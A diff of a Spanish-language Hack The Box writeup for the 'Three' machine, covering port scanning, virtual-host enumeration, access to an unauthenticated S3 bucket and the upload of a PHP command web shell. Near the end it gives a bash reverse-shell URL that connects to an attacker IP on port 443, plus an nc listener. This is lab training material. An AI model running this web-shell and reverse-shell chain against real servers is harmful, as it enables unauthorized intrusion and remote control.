@@ -1,28 +1,34 @@
 ---
-title: "Writeup fawn - Hack The Box - Resolución y Análisis"
+title: Writeup three - Hack The Box - Resolución y Análisis
 published: true
 tags:
   - hackthebox
   - writeup
-  - fawn
+  - three
   - ciberseguridad
   - pentesting
-description: "Writeup y resolución de la máquina fawn en Hack The Box."
+description: Writeup y resolución de la máquina three en Hack The Box.
 keywords:
-  - writeup fawn
-  - hack the box fawn
-  - resolución máquina fawn
-  - fawn hack the box
-  - htb fawn
+  - writeup three
+  - hack the box three
+  - resolución máquina three
+  - three hack the box
+  - htb three
 ---
-
+------
 ### 🔗 Accesos rápidos
 
-- 📄 **Writeup online**: [https://bunzopy.github.io/writeups-apuntes/fawn](https://bunzopy.github.io/writeups-apuntes/fawn)
-- 📺 **Resolución en vivo (completa)**: [https://youtube.com/tu-video-completo](https://youtube.com/tu-video-completo)
-- 🧠 **Explicación resumida**: [https://youtube.com/tu-video-resumido](https://youtube.com/tu-video-resumido)
+- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Linux/Three)
+- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=jVak5k46ODM)|[Parte2](https://www.youtube.com/watch?v=k6nprw1Ol_w)                                                                                                             
+- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=sGjqDbMId3U)
+
+-----
+
+#easy #linux #ping #nmap #nvim #sudo #/etc/hosts #aws #reverseshell #whatweb  #gobuster #cat
 
 ---
+# Guided Mode
+
 1)¿Cuántos puertos TCP hay abiertos?
 	2
 
@@ -34,14 +40,12 @@ keywords:
 
 4)¿Qué subdominio se descubre durante la enumeración posterior?
 	s3.thetoppers.htb
-	[[aws]]
 	
 5)¿Qué servicio se ejecuta en el subdominio descubierto?
 	amazon s3
 
 6)¿Qué utilidad de línea de comandos puede utilizarse para interactuar con el servicio que se ejecuta en el subdominio descubierto?
 	awscli
-	Pero el comando para usar en consola es aws
 
 7)¿Qué comando se utiliza para configurar la instalación de la CLI de AWS?
 	aws configure
@@ -65,18 +69,20 @@ nmap -sCV -p22,80 10.129.227.248 -oN target
 ![[Three1.png]]
 
 ![[Three2.png]]
-
-Sabemos que es una maquina linux por el ttl cercano a 64, y que el puerto 22 esta abierto con un servicio ssh y el 80 con un apache
+*TTL:* Maquina Linux
+*Puertos:*
+	`22` [[ssh]]
+	`80` HTTP
 
 ------
 # [[Whatweb-wappalyzer]]
 ![[Three3.png]]
-El script de nmap no conectaba y el whatweb nos da el mail con dominio thetoppers.htb que lo vamos a agregar a etc/hosts para probar
+Nos da el mail con dominio thetoppers.htb que lo vamos a agregar a etc/hosts para probar
 
 ------
-
 # Agregar dominio a /etc/hosts
 
+Vamos a ejecutar con [[nvim]] y [[sudo]] el comando `sudo nvim /etc/hosts` para modificar el archivo abriendolo como root
 ```
 10.129.227.248 thetoppers.htb
 ```
@@ -86,7 +92,6 @@ El script de nmap no conectaba y el whatweb nos da el mail con dominio thetopper
 --------
 
 # Enumeracion de subdominios con [[Gobuster]]
-Tuvimos que usar el gobuster, por que en el ffuf no salia nada y al ver el writeup, vemos que con gobuster si encontraba el subdominio, pero como sale con codigo de estado 404, no nos aparece en ffuf
 
 ```shell
 gobuster vhost -u http://thetoppers.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
@@ -96,7 +101,9 @@ gobuster vhost -u http://thetoppers.htb -w /usr/share/SecLists/Discovery/DNS/sub
 Como resultado tenemos s3.thetoppers.htb
 
 -----
-# Agregar dominio a /etc/hosts
+# Agregar subdominio a /etc/hosts
+
+Vamos a ejecutar con [[nvim]] y [[sudo]] el comando `sudo nvim /etc/hosts` para modificar el archivo abriendolo como root
 
 ```
 10.129.182.45 s3.thetoppers.htb
@@ -108,9 +115,12 @@ Ahora entramos a la pagina `http://s3.thetoppers.htb/` y ya nos va a cargar
 ![[Three13.png]]
 
 -------
-# Intrusion a la maquina con [[aws]]
+# Carga de archivo malisioso con [[aws]]
 
 Vamos a acceder a los contenedores de amazon s3, y ver sus contenidos para enumerar un poco, podemos ver que estos son los archivos de la pagina principal, asi que vamos a cargar posteriormente un archivo que nos permita ejecutar comandos
+
+Con el primer comando al ver que nos responde thetoppers.htb sabemos que esta hosteando la pagina victima, asi que vamos a intentar cargar y/o modificar archivos
+Con el segundo comando visualizamos el contenido del directorio
 
 ```shell
 aws --endpoint-url http://s3.thetoppers.htb s3 ls --no-sign-request
@@ -118,18 +128,9 @@ aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-
 ```
 
 ![[Three7.png]]
-Con el primer comando al ver que nos responde thetoppers.htb sabemos que esta hosteando la pagina victima, asi que vamos a intentar cargar y/o modificar archivos
-Con el segundo comando visualizamos el contenido del directorio
 
 
 
-Vamos a descargar el archivo index para ver si nos da alguna pista:
-```shell
-aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/index.php --no-sign-request
-```
-
-![[Three10.png]]
-El contenido del archivo index no nos dio ningun dato util
 #### Cargamos el archivo [[archivo php inyección comandos]]
 
 Contenido del archivo exploit.php
@@ -151,23 +152,15 @@ http://thetoppers.htb/exploit.php?cmd=id
 Como podemos ver nos muestra nos responde, asi que el archivo cumple su funcion correctamente
 
 
-
 -------
-## Enviamos la [[Reverse shell]] mientras estamos en escucha con [[nc -nlvp 443]] en nuestra maquina
+# [[Reverse shell]]
 
-##### Desde la maquina victima:
-
-```
-http://thetoppers.htv/exploit.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'
-```
+Desde la maquina victima vamos a ejecutar el siguiente link `http://thetoppers.htv/exploit.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'`
 
 ![[Three11.png]]
 
-##### Desde la maquina atacante:
+Mientras que desde nuestra maquina vamos a estar en escucha con [[nc -nlvp 443]]
 
-```
-nc -nlvp 443
-```
 ![[Three12.png]]
 Una vez dentro de la maquina cateamos la flag
 
